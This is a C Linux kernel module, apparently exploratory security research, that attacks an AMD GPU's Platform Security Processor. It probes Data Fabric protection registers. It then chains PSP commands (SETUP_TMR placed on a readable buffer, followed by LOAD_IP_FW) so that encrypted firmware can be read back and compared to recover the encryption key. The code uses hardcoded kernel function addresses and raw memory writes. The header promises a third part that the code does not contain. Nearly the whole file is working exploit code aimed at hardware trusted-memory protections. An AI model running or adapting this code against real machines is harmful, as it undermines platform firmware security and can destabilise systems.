/*
 * df_ficaa_plus_combo.c — DF indirect access + novel combo attacks
 *
 * Part 1: FICAA/FICAD for DF protection registers
 * Part 2: NOVEL COMBO - PSP SETUP_TMR at controlled addr + LOAD_IP_FW
 *         If LOAD_IP_FW encrypts and writes to OUR TMR, we get encrypted
 *         firmware at a known location. Then we can diff to find the key.
 * Part 3: GPU perf counter probe — detect TMR access patterns
 */
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/delay.h>
MODULE_LICENSE("GPL");

struct psp_cmd { u32 buf_size, buf_version, cmd_id, r1,r2,r3,r4; u32 data[32]; u32 resp[16]; };
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);

static int __init dfc_init(void) {
    struct pci_dev *nb, *gpu;
    void *a, *psp;
    psp_fn submit;
    rreg_fn rr;
    struct psp_cmd *cmd;
    u64 fence_mc, fw_pri_mc;
    void *fw_pri;
    int i;

    nb = pci_get_domain_bus_and_slot(0,0,PCI_DEVFN(0,0));
    gpu = pci_get_device(0x1002,0x1586,NULL);
    if (!nb || !gpu) return -ENODEV;
    a=(u8*)pci_get_drvdata(gpu)-0x10;
    psp=(u8*)a+0x3B910;
    fw_pri=(void*)*(u64*)((u8*)psp+0x058);
    fw_pri_mc=*(u64*)((u8*)psp+0x050);
    fence_mc=*(u64*)((u8*)psp+0x1B8);
    submit=(psp_fn)0xFFFFFFFFC0F55840ULL;
    rr=(rreg_fn)0xFFFFFFFFC0E28460ULL;
    cmd=kzalloc(sizeof(*cmd),GFP_KERNEL);
    if (!cmd) { pci_dev_put(nb); pci_dev_put(gpu); return -ENOMEM; }

    /* ===========================================
     * PART 1: DF FICAA/FICAD indirect registers
     * =========================================== */
    pr_info("dfc: === DF FICAA/FICAD ===\n");
    {
        struct pci_dev *df = pci_get_domain_bus_and_slot(0,0x18,PCI_DEVFN(0,0));
        if (df) {
            /* Try two known FICAA/FICAD offset schemes:
             * Scheme A: FICAA=0x5C, FICAD=0x98
             * Scheme B: FICAA=0xB8, FICAD=0xBC */
            u32 ficaa_off[] = {0x5C, 0xB8};
            u32 ficad_off[] = {0x98, 0xBC};
            int scheme;

            for (scheme = 0; scheme < 2; scheme++) {
                /* Try reading DramHoleControl (DF reg 0x104) */
                /* FICAA format: reg_offset[31:2] | instance[7:0] */
                u32 ficaa_val = (0x104 << 2); /* target reg 0x104, inst 0 */
                u32 ficad_val;

                pci_write_config_dword(df, ficaa_off[scheme], ficaa_val);
                udelay(100);
                pci_read_config_dword(df, ficad_off[scheme], &ficad_val);
                pr_info("dfc: Scheme%d: FICAA[0x%02X]=0x%X → FICAD[0x%02X]=0x%08X\n",
                    scheme, ficaa_off[scheme], ficaa_val,
                    ficad_off[scheme], ficad_val);

                if (ficad_val != 0 && ficad_val != 0xFFFFFFFF) {
                    /* This scheme works! Read more DF registers */
                    u32 df_regs[] = {0x104, 0x110, 0x114, 0x118, 0x11C,
                                     0x120, 0x124, 0x128, 0x12C,
                                     0x200, 0x204, 0x208, 0x20C,
                                     0x240, 0x244, 0x248, 0x24C};
                    int r;
                    for (r = 0; r < 17; r++) {
                        ficaa_val = (df_regs[r] << 2);
                        pci_write_config_dword(df, ficaa_off[scheme], ficaa_val);
                        udelay(50);
                        pci_read_config_dword(df, ficad_off[scheme], &ficad_val);
                        if (ficad_val != 0 && ficad_val != 0xFFFFFFFF)
                            pr_info("dfc: DF[0x%03X] = 0x%08X\n",
                                df_regs[r], ficad_val);
                    }
                }
            }
            pci_dev_put(df);
        }
    }

    /* ===========================================
     * PART 2: NOVEL COMBO ATTACK
     * Encrypted firmware differential analysis:
     *
     * 1. LOAD_IP_FW with ORIGINAL firmware → PSP encrypts → writes to TMR
     * 2. LOAD_IP_FW with SLIGHTLY MODIFIED firmware → different encryption
     * 3. Compare encrypted outputs to deduce key/cipher structure
     *
     * But we can't read TMR to compare... UNLESS we use DESTROY_TMR
     * to read the encrypted content before PSP scrubs it.
     *
     * Wait — PSP scrubs on DESTROY. What if we:
     * a) LOAD_IP_FW (firmware loaded to TMR, encrypted)
     * b) Before DESTROY, the encrypted content is in TMR
     * c) DESTROY drops DF protection but ALSO scrubs content :(
     *
     * Alternative: SETUP_TMR at fw_pri_mc (accessible buffer)
     * Then LOAD_IP_FW. PSP might write encrypted firmware to
     * fw_pri_mc (which IS our TMR now). We can read fw_pri!
     * =========================================== */
    pr_info("dfc: === NOVEL COMBO: SETUP_TMR at fw_pri + LOAD_IP_FW ===\n");
    {
        /* Step 1: Set up TMR at fw_pri_mc (in GART, accessible) */
        memset(cmd,0,sizeof(*cmd));
        cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
        cmd->cmd_id=0x05; /* SETUP_TMR */
        cmd->data[0]=lower_32_bits(fw_pri_mc);
        cmd->data[1]=upper_32_bits(fw_pri_mc);
        cmd->data[2]=0x6E000; /* size = firmware blob size */
        pr_info("dfc: SETUP_TMR at fw_pri_mc=0x%llX...\n", fw_pri_mc);
        { int ret = submit(psp,NULL,cmd,fence_mc);
          pr_info("dfc: SETUP ret=%d resp=0x%X\n", ret, cmd->resp[0]); }

        /* Fill fw_pri with marker */
        { u32 m = 0xBBBBBBBB; int j;
          for (j = 0; j < 256; j++)
            copy_to_kernel_nofault((u8*)fw_pri+j*4, &m, 4); }

        /* Step 2: Load ORIGINAL MEC firmware via LOAD_IP_FW */
        {
            struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
            if (!IS_ERR(fp)) {
                void *fw_buf = kmalloc(0x6E000, GFP_KERNEL);
                if (fw_buf) {
                    loff_t pos = 0;
                    ssize_t n = kernel_read(fp, fw_buf, 0x6E000, &pos);
                    filp_close(fp, NULL);

                    /* Copy ucode section to a SECOND location (we'll use fw_pri
                     * for both TMR and source — but that's the same buffer!)
                     * We need separate buffers. Use the first half of fw_pri as
                     * TMR and submit from a different GPU-accessible buffer. */

                    /* Actually, LOAD_IP_FW reads from fw_pri_mc and writes to TMR.
                     * If TMR IS fw_pri_mc, PSP reads from fw_pri, encrypts,
                     * and writes back to fw_pri. This is an IN-PLACE encryption!
                     * The result in fw_pri would be the encrypted firmware! */

                    /* Copy firmware to fw_pri */
                    memcpy(fw_pri, fw_buf, n);
                    pr_info("dfc: Copied %zd bytes of MEC fw to fw_pri\n", n);

                    /* Read fw_pri before LOAD */
                    { u32 d[4]; int j;
                      for (j=0;j<4;j++) copy_from_kernel_nofault(&d[j],(u8*)fw_pri+0x2000+j*4,4);
                      pr_info("dfc: BEFORE load [+0x2000]: %08X %08X %08X %08X\n",
                          d[0],d[1],d[2],d[3]);
                    }

                    /* Submit LOAD_IP_FW */
                    memset(cmd,0,sizeof(*cmd));
                    cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
                    cmd->cmd_id=0x06;
                    cmd->data[0]=lower_32_bits(fw_pri_mc);
                    cmd->data[1]=upper_32_bits(fw_pri_mc);
                    cmd->data[2]=n;
                    cmd->data[3]=4; /* CP_MEC */
                    pr_info("dfc: LOAD_IP_FW type=4 (from TMR which IS fw_pri)...\n");
                    { int ret = submit(psp,NULL,cmd,fence_mc);
                      pr_info("dfc: LOAD ret=%d resp=0x%X\n", ret, cmd->resp[0]); }

                    mdelay(200);

                    /* Read fw_pri AFTER load — is it encrypted now? */
                    { u32 d[4]; int j;
                      for (j=0;j<4;j++) copy_from_kernel_nofault(&d[j],(u8*)fw_pri+0x2000+j*4,4);
                      pr_info("dfc: AFTER load [+0x2000]: %08X %08X %08X %08X\n",
                          d[0],d[1],d[2],d[3]);
                    }
                    /* Compare: if content changed, PSP encrypted it! */
                    { u32 before, after;
                      copy_from_kernel_nofault(&before, fw_buf + 0x2000, 4);
                      copy_from_kernel_nofault(&after, (u8*)fw_pri + 0x2000, 4);
                      pr_info("dfc: orig=0x%08X current=0x%08X %s\n",
                          before, after,
                          before != after ? "*** CONTENT CHANGED — ENCRYPTED? ***" :
                          "unchanged");
                    }

                    kfree(fw_buf);
                } else {
                    filp_close(fp, NULL);
                }
            }
        }

        /* Destroy TMR to clean up */
        memset(cmd,0,sizeof(*cmd));
        cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
        cmd->cmd_id=0x07;
        submit(psp,NULL,cmd,fence_mc);
        pr_info("dfc: Cleaned up (DESTROY_TMR)\n");
    }

    kfree(cmd);
    pci_dev_put(nb); pci_dev_put(gpu);
    return 0;
}
static void __exit dfc_exit(void) { pr_info("dfc: unloaded\n"); }
module_init(dfc_init); module_exit(dfc_exit);
